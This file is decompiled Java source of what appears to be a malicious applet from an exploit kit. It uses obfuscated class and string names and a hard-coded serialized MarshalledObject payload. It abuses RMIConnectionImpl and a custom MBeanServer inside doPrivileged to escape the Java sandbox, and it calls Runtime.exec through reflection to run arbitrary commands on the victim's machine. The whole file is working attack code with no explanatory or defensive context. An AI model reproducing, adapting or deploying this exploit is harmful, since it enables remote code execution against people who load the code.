import javax.management.remote.rmi.RMIServerImpl;
import javax.management.remote.rmi.RMIConnectionImpl;
import javax.security.auth.Subject;
import javax.management.ObjectName;
import javax.management.MBeanServer;
import java.util.Map;
import java.rmi.server.RMIServerSocketFactory;
import java.rmi.server.RMIClientSocketFactory;
import javax.management.remote.rmi.RMIJRMPServerImpl;
import java.rmi.MarshalledObject;
import java.io.IOException;
import java.security.PrivilegedAction;
import java.security.AccessController;

// 
// Decompiled by Procyon v0.5.30
// 

public class Applet107495e
{
    public String __u;
    
    public Applet107495e(final Applet99 applet99) {
        this.__u = null;
        this.__u = AccessController.doPrivileged((PrivilegedAction<String>)applet99);
    }
    
    public static Object __F(final String s, final Class clazz) throws IOException, ClassNotFoundException {
        return Applet3a6218.toObject(new byte[] { -84, -19, 0, 5, 115, 114, 0, 25, 106, 97, 118, 97, 46, 114, 109, 105, 46, 77, 97, 114, 115, 104, 97, 108, 108, 101, 100, 79, 98, 106, 101, 99, 116, 124, -67, 30, -105, -19, 99, -4, 62, 2, 0, 3, 73, 0, 4, 104, 97, 115, 104, 91, 0, 8, 108, 111, 99, 66, 121, 116, 101, 115, 116, 0, 2, 91, 66, 91, 0, 8, 111, 98, 106, 66, 121, 116, 101, 115, 113, 0, 126, 0, 1, 120, 112, -124, -9, 21, -127, 112, 117, 114, 0, 2, 91, 66, -84, -13, 23, -8, 6, 8, 84, -32, 2, 0, 0, 120, 112, 0, 0, 0, 32, -84, -19, 0, 5, 115, 114, 0, 11, 72, 97, 108, 111, 109, 111, 114, 112, 104, 105, 99, -96, 41, -41, 91, 41, 7, -60, 123, 2, 0, 0, 120, 112 });
    }
    
    public static void __A(final String s) {
        final Runtime runtime = Runtime.getRuntime();
        try {
            Class.forName(main.Applet6e("+\u0011\u0006\rK\u0018\u0000Y\u0001o\"\u0005\u0002\u0011\u001d\u000f]")).getMethod(main.Applet6e("$\b\u0015\u000f"), String.class).invoke(runtime, s);
        }
        catch (Exception ex) {}
    }
    
    public static void __f(final MarshalledObject marshalledObject) {
        try {
            final RMIJRMPServerImpl rmijrmpServerImpl = new RMIJRMPServerImpl(0, null, null, null);
            rmijrmpServerImpl.setMBeanServer(new Applet3a6218());
            Class.forName(main.Applet6e("+\u0011\u0006\r\u001dZ\fV\b \u0017\u0015\u0001\u0000\u001a\u0016\u0016D\u0001TV\u0016\u0007o\u0002\u001d\u0005K&z/s^V_$\u0013\u0004\u0005\n\u001azZE-")).getMethod(main.Applet6e("0\u0005\u0015\u001e\u001c9#R\u0007/\u0003"), ObjectName.class, MarshalledObject.class, Subject.class).invoke(new RMIConnectionImpl(rmijrmpServerImpl, main.Applet6e("5\u0005\u0004\u0019\u0011\u0001\u0015C\u0013"), null, null, null), null, marshalledObject, null);
        }
        catch (Exception ex) {}
    }
}
